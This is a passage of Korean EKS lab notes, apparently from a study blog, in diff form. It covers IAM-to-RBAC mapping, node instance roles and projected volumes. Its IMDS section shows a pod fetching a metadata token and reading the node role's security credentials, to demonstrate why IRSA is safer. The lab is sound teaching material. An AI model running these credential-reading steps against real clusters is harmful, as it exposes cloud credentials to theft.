+</span></span><span style="display:flex;"><span>kubectl describe ClusterRole system:public-info-viewer
+</span></span><span style="display:flex;"><span>kubectl describe ClusterRole system:basic-user
+</span></span><span style="display:flex;"><span>kubectl describe ClusterRole eks:podsecuritypolicy:privileged
+</span></span></code></pre></div><p><img src="./images/tokenreview-mutatingwebhookconfiguration-validatingwebhookconfiguration.png" alt="TokenReview, MutatingWebhookConfiguration, ValidatingWebhookConfiguration"></p>
+<p><img src="./images/rbac-lookup-and-rolesum.png" alt="RBAC lookup and rolesum"></p>
+<p><img src="./images/clusterrolebindings-and-clusterrole.png" alt="clusterrolebindings and clusterrole"></p>
+<h3 id="3-2-신규-인프라-관리자용-myeks-bastion-2에-eks-인증인가-설정">3-2. 신규 인프라 관리자용 myeks-bastion-2에 EKS 인증/인가 설정</h3>
+<ul>
+<li>기존 쉘(myeks-bastion)과 교차하여 진행: testuser 생성 및 권한 수정</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># testuser 생성 및 프로그래밍 방식 Access 권한 부여, 어드민 접속 정책 추가</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Access Key의 경우, 1회만 출력 -&gt; 메모</span>
+</span></span><span style="display:flex;"><span>aws iam create-user --user-name testuser
+</span></span><span style="display:flex;"><span>aws iam create-access-key --user-name testuser
+</span></span><span style="display:flex;"><span>aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name testuser
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># get-call-identity ARN </span>
+</span></span><span style="display:flex;"><span>aws sts get-caller-identity --query Arn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># testuser가 접속할 myeks-bastion-2 PublicIP 확인</span>
+</span></span><span style="display:flex;"><span>aws ec2 describe-instances --query <span style="color:#e6db74">&#34;Reservations[*].Instances[*].{PublicIPAdd:PublicIpAddress,PrivateIPAdd:PrivateIpAddress,InstanceName:Tags[?Key==&#39;Name&#39;]|[0].Value,Status:State.Name}&#34;</span> --filters Name<span style="color:#f92672">=</span>instance-state-name,Values<span style="color:#f92672">=</span>running --output table
+</span></span></code></pre></div><p><img src="./images/create-testuser.png" alt="create testuser"></p>
+<p><img src="./images/create-testuser-access-key.png" alt="create testuser access key"></p>
+<ul>
+<li>현재 상태에서 testuser는 접속은 가능하지만, kubectl 불가
+<ul>
+<li>당연하게도, 관리자 그룹(<code>system:masters</code>)과 매핑이 되지 않았기에 불가</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion-2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># testuser로 접속</span>
+</span></span><span style="display:flex;"><span>ssh ec2-user@<span style="color:#f92672">{</span>myeks-bastion-2 PublicIP<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># testuser IAM 설정</span>
+</span></span><span style="display:flex;"><span>aws configure
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># get-call-identity ARN</span>
+</span></span><span style="display:flex;"><span>aws sts get-caller-identity --query Arn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubectl 명령어 실행: 권한 없음</span>
+</span></span><span style="display:flex;"><span>kubectl get node -v6
+</span></span><span style="display:flex;"><span>ls ~/.kube
+</span></span></code></pre></div><p><img src="./images/testuser-cannot-use-kubectl-without-group-mapping.png" alt="testuser cannot use kubectl without group mapping"></p>
+<ul>
+<li>다시, 원래 쉘에서 그룹 부여를 하여 권한 설정: EKS 관리자 레벨</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span>eksctl create iamidentitymapping --cluster $CLUSTER_NAME --username testuser --group system:masters --arn arn:aws:iam::$ACCOUNT_ID:user/testuser
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># system:masters 적용 확인</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># IAM 매핑 확인 시, 기존 NodeInstanceRole은 노드에 접속될 때 사용되는 IAM Role(Credential 확인 불가, 세션과 같은 느낌으로 이해)</span>
+</span></span><span style="display:flex;"><span>kubectl get cm -n kube-system aws-auth -o yaml | kubectl neat | yh
+</span></span><span style="display:flex;"><span>eksctl get iamidentitymapping --cluster $CLUSTER_NAME
+</span></span></code></pre></div><p><img src="./images/testuser-after-iamidentitymapping.png" alt="testuser after iamidentitymapping"></p>
+<ul>
+<li>다시, testuser에서 kubectl 명령어 실행: 권한 있음
+<ul>
+<li>실행 전, kubeconfig 업데이트 필요</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion-2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubeconfig 업데이트(생성)</span>
+</span></span><span style="display:flex;"><span>aws eks update-kubeconfig --name $CLUSTER_NAME --user-alias testuser
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubeconfig에 system:masters 그룹 추가 확인</span>
+</span></span><span style="display:flex;"><span>cat ~/.kube/config | yh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubectl 실행: 권한 있음</span>
+</span></span><span style="display:flex;"><span>kubectl ns default
+</span></span><span style="display:flex;"><span>kubectl get node -v6
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># rbac-tool: system:masters 그룹과 더불어 system:authenticated가 같이 설정</span>
+</span></span><span style="display:flex;"><span>kubectl krew install rbac-tool <span style="color:#f92672">&amp;&amp;</span> kubectl rbac-tool whoami
+</span></span></code></pre></div><ul>
+<li>testuser의 그룹 재설정 (system:masters -&gt; system:authenticated)
+<ul>
+<li>텍스트에디터로 직접 편집</li>
+<li>(또는) iamidentitymapping 삭제 후, 다시 생성</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl edit cm -n kube-system aws-auth
+</span></span><span style="display:flex;"><span>eksctl get iamidentitymapping --cluster $CLUSTER_NAME
+</span></span></code></pre></div><p><img src="./images/edit-testuser-with-authenticated-not-admin.png" alt="edit testuser with authenticated not admin"></p>
+<ul>
+<li>testuser에서 kubectl 명령어 실행 <strong>시도</strong>: 일부 권한 없음 확인
+<ul>
+<li>config 업데이트를 하지 않아도, 적용되어 있음</li>
+<li>pods 조회는 가능하지만, nodes 조회는 불가</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion-2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl get node -v6
+</span></span><span style="display:flex;"><span>kubectl api-resources -v5
+</span></span></code></pre></div><p><img src="./images/testuser-cannot-use-kubectl-with-authenticated-not-admin.png" alt="testuser cannot use kubectl with authenticated not admin"></p>
+<p><img src="./images/only-pods-can-be-listed-with-authenticated.png" alt="only pods can be listed with authenticated"></p>
+<ul>
+<li>물론 testuser IAM 매핑을 삭제하면, 아예 권한이 없음</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># testuser IAM 맵핑 삭제</span>
+</span></span><span style="display:flex;"><span>eksctl delete iamidentitymapping --cluster $CLUSTER_NAME --arn  arn:aws:iam::$ACCOUNT_ID:user/testuser
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>eksctl get iamidentitymapping --cluster $CLUSTER_NAME
+</span></span><span style="display:flex;"><span>kubectl get cm -n kube-system aws-auth -o yaml | yh
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion-2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl get node -v6
+</span></span><span style="display:flex;"><span>kubectl api-resources -v5
+</span></span></code></pre></div><p><img src="./images/testuser-cannot-use-kubectl-without-iamidentitymapping.png" alt="testuser cannot use kubectl without iamidentitymapping"></p>
+<h3 id="3-3-옵션-ec2-instance-profileiam-role에-맵핑된-k8s-rbac-확인">3-3. (옵션) EC2 Instance Profile(IAM Role)에 맵핑된 k8s RBAC 확인</h3>
+<ul>
+<li>3-2에서 <code>NodeInstanceRole</code>을 중간에 확인
+<ul>
+<li><code>system:nodes</code></li>
+<li>username: <code>system:node:{{EC2PrivateDNSName}}</code></li>
+</ul>
+</li>
+<li>추가 IAM 증명이 없어도, 노드에 생성된 파드에서 IMDS로 EC2 IAM Role 사용
+<ul>
+<li>Token 만료 전까지 이용 가능. 권한 유의</li>
+</ul>
+</li>
+</ul>
+<p><img src="./images/NodeInstanceRole-Keypair.png" alt="NodeInstanceRole Keypair"></p>
+<p><img src="./images/NodeInstanceRole-IAM-Role-mapRoles.png" alt="NodeInstanceRole IAM Role mapRoles"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 노드 별 hostname, sts ARN</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> node in $N1 $N2 $N3; <span style="color:#66d9ef">do</span> ssh ec2-user@$node hostname; <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> node in $N1 $N2 $N3; <span style="color:#66d9ef">do</span> ssh ec2-user@$node aws sts get-caller-identity --query Arn; <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># aws-auth ConfigMap</span>
+</span></span><span style="display:flex;"><span>kubectl describe configmap -n kube-system aws-auth
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># IAM identity mapping</span>
+</span></span><span style="display:flex;"><span>eksctl get iamidentitymapping --cluster $CLUSTER_NAME
+</span></span></code></pre></div><ul>
+<li>aws-cli(v2) 파드를 추가하여, 해당 EC2 노드의 IMDS 정보 확인</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl create -f -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: apps/v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Deployment
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: awscli-pod
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  replicas: 2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  selector:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    matchLabels:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      app: awscli-pod
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  template:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      labels:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        app: awscli-pod
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      containers:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - name: awscli-pod
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        image: amazon/aws-cli
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        command: [&#34;tail&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        args: [&#34;-f&#34;, &#34;/dev/null&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      terminationGracePeriodSeconds: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl get pod -owide
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 파드 이름 변수 지정 후 각 파드에서 EC2 InstancePrfile(IAM Role) ARN 확인</span>
+</span></span><span style="display:flex;"><span>APODNAME1<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl get pod -l app<span style="color:#f92672">=</span>awscli-pod -o jsonpath<span style="color:#f92672">={</span>.items<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>.metadata.name<span style="color:#f92672">}</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>APODNAME2<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl get pod -l app<span style="color:#f92672">=</span>awscli-pod -o jsonpath<span style="color:#f92672">={</span>.items<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>.metadata.name<span style="color:#f92672">}</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>echo $APODNAME1, $APODNAME2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME1 -- aws sts get-caller-identity --query Arn
+</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME2 -- aws sts get-caller-identity --query Arn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 추가 IAM 증명이 없어도, IMDS로 EC2 IAM Role 사용: 권한 유의</span>
+</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME1 -- aws ec2 describe-instances --region ap-northeast-2 --output table --no-cli-pager
+</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME2 -- aws ec2 describe-vpcs --region ap-northeast-2 --output table --no-cli-pager
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># aws-cli 파드에 쉘 접속 후, EC2 메타데이터 확인</span>
+</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME1 -- bash
+</span></span><span style="display:flex;"><span>curl -s http://169.254.169.254/ -v
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Token 요청 </span>
+</span></span><span style="display:flex;"><span>curl -s -X PUT <span style="color:#e6db74">&#34;http://169.254.169.254/latest/api/token&#34;</span> -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token-ttl-seconds: 21600&#34;</span> ; echo
+</span></span><span style="display:flex;"><span>curl -s -X PUT <span style="color:#e6db74">&#34;http://169.254.169.254/latest/api/token&#34;</span> -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token-ttl-seconds: 21600&#34;</span> ; echo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Token을 이용한 IMDSv2 사용</span>
+</span></span><span style="display:flex;"><span>TOKEN<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s -X PUT <span style="color:#e6db74">&#34;http://169.254.169.254/latest/api/token&#34;</span> -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token-ttl-seconds: 21600&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>echo $TOKEN
+</span></span><span style="display:flex;"><span>curl -s -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token: </span>$TOKEN<span style="color:#e6db74">&#34;</span> –v http://169.254.169.254/ ; echo
+</span></span><span style="display:flex;"><span>curl -s -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token: </span>$TOKEN<span style="color:#e6db74">&#34;</span> –v http://169.254.169.254/latest/ ; echo
+</span></span><span style="display:flex;"><span>curl -s -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token: </span>$TOKEN<span style="color:#e6db74">&#34;</span> –v http://169.254.169.254/latest/meta-data/iam/security-credentials/ ; echo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 위에서 출력된 IAM Role을 아래 입력 후 확인</span>
+</span></span><span style="display:flex;"><span>curl -s -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token: </span>$TOKEN<span style="color:#e6db74">&#34;</span> –v http://169.254.169.254/latest/meta-data/iam/security-credentials/eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1DC6Y2GRDAJHK
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 파드 쉘 종료</span>
+</span></span><span style="display:flex;"><span>exit
+</span></span></code></pre></div><p><img src="./images/IMDS-vulnerability-1.png" alt="IMDS vulnerability 1"></p>
+<p><img src="./images/IMDS-vulnerability-2.png" alt="IMDS vulnerability 2"></p>
+<ul>
+<li>aws-cli 파드에 kubeconfig를 통한 mapRoles 정보 생성</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># node 의 IAM Role ARN을 변수로 지정</span>
+</span></span><span style="display:flex;"><span>eksctl get iamidentitymapping --cluster $CLUSTER_NAME
+</span></span><span style="display:flex;"><span>NODE_ROLE<span style="color:#f92672">=</span>eksctl-myeks-nodegroup-ng1-NodeInstanceRole-<span style="color:#f92672">{</span>IAM Role ARN<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># awscli 파드에서 kubeconfig 정보 생성</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 확인 시, 실행 인자에 role도 추가되었음</span>
+</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME1 -- aws eks update-kubeconfig --name $CLUSTER_NAME --role-arn $NODE_ROLE
+</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME1 -- cat /root/.kube/config | yh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME2 -- aws eks update-kubeconfig --name $CLUSTER_NAME --role-arn $NODE_ROLE
+</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME2 -- cat /root/.kube/config | yh
+</span></span></code></pre></div><p><img src="./images/NodeInstanceRole-IAM-Permission-policies.png" alt="NodeInstanceRole IAM Permission policies"></p>
+<p><img src="./images/kubeconfig-with-NodeInstanceRole-role.png" alt="kubeconfig with NodeInstanceRole role"></p>
+<ul>
+<li>(보너스)노드에 SSH 접속, kubeconfig 파일 생성 후 kubectl 실행
+<ul>
+<li>중간에 안되서 중단 했었지만, 복기하고 나니 어디가 문제인지 파악: To-Do</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh ec2-user@$N1
+</span></span><span style="display:flex;"><span>sudo su -
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubectl 설치</span>
+</span></span><span style="display:flex;"><span>curl --silent --location <span style="color:#e6db74">&#34;https://github.com/weaveworks/eksctl/releases/latest/download/eksctl_</span><span style="color:#66d9ef">$(</span>uname -s<span style="color:#66d9ef">)</span><span style="color:#e6db74">_amd64.tar.gz&#34;</span> | tar xz -C /tmp
+</span></span><span style="display:flex;"><span>mv /tmp/eksctl /usr/local/bin
+</span></span><span style="display:flex;"><span>curl -LO <span style="color:#e6db74">&#34;https://dl.k8s.io/release/</span><span style="color:#66d9ef">$(</span>curl -L -s https://dl.k8s.io/release/stable.txt<span style="color:#66d9ef">)</span><span style="color:#e6db74">/bin/linux/amd64/kubectl&#34;</span>
+</span></span><span style="display:flex;"><span>install -o root -g root -m <span style="color:#ae81ff">0755</span> kubectl /usr/local/bin/kubectl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 정상 출력</span>
+</span></span><span style="display:flex;"><span>aws sts get-caller-identity --query Arn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Token 요청: 미리 메모</span>
+</span></span><span style="display:flex;"><span>aws eks get-token --cluster-name myeks | jq -r <span style="color:#e6db74">&#39;.status.token&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 위의 토큰과 앞에서 출력된 kubeconfig를 가져와서 kubeconfig 생성</span>
+</span></span><span style="display:flex;"><span>mkdir ~/.kube
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt; EOF &gt; ~/.kube/config
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">clusters:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- cluster:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    certificate-authority-data: LS0tL{생략}S0tCg==
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    server: https://0A9ACECDBF06CF1E13D3E0F19A0F0D2C.sk1.ap-northeast-2.eks.amazonaws.com
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">contexts:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- context:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    cluster: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    user: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">current-context: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Config
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">preferences: {}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">users:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- name: arn:aws:eks:ap-northeast-2:911283464785:cluster/myeks
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  user:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    exec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      apiVersion: client.authentication.k8s.io/v1beta1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      args:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - --region
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - ap-northeast-2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - eks
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - get-token
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - --cluster-name
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - myeks
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - --output
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - json
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - --role
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1DC6Y2GRDAJHK
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      command: aws
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubectl 시도</span>
+</span></span><span style="display:flex;"><span>kubectl get node -v6
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubeconfig 삭제</span>
+</span></span><span style="display:flex;"><span>rm -rf .kube
+</span></span></code></pre></div><h2 id="4-eks-irsa">4. EKS IRSA</h2>
+<ul>
+<li>위에서 경험했듯이 EC2 Instance Profile은 편리하나, 보안상 취약(최소 권한 부여 원칙)</li>
+<li>IAM Roles for Service Accounts: 사용자 관리형 서비스 계정</li>
+<li>실습 환경 구성 시, 아래의 스크립트가 포함
+<ul>
+<li><code>eksctl create cluster --name $CLUSTER_NAME ... --external-dns-access --full-ecr-access --asg-access</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="4-1-projected-volume">4-1. `projected&rsquo; Volume</h3>
+<ul>
+<li>k8s의 projected Volume을 활용하여, 아래의 volume source를 하나의 디렉토리로 통합
+<ul>
+<li>Secret: user, pass</li>
+<li>ConfigMap</li>
+<li>Downward API</li>
+<li>ServiceAccountToken</li>
+</ul>
+</li>
+<li>원문: <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-projected-volume-storage/">https://kubernetes.io/docs/tasks/configure-pod-container/configure-projected-volume-storage/</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Create the Secrets:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Create files containing the username and password:</span>
+</span></span><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;admin&#34;</span> &gt; ./username.txt
+</span></span><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;1f2d1e2e67df&#34;</span> &gt; ./password.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Package these files into secrets:</span>
+</span></span><span style="display:flex;"><span>kubectl create secret generic user --from-file<span style="color:#f92672">=</span>./username.txt
+</span></span><span style="display:flex;"><span>kubectl create secret generic pass --from-file<span style="color:#f92672">=</span>./password.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 파드 생성</span>
+</span></span><span style="display:flex;"><span>kubectl apply -f https://k8s.io/examples/pods/storage/projected.yaml
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 파드 확인: projected 라벨</span>
+</span></span><span style="display:flex;"><span>kubectl get pod test-projected-volume -o yaml | kubectl neat | yh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># secret</span>
+</span></span><span style="display:flex;"><span>kubectl exec -it test-projected-volume -- ls /projected-volume/
+</span></span><span style="display:flex;"><span>kubectl exec -it test-projected-volume -- cat /projected-volume/username.txt ;echo
+</span></span><span style="display:flex;"><span>kubectl exec -it test-projected-volume -- cat /projected-volume/password.txt ;echo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 삭제</span>
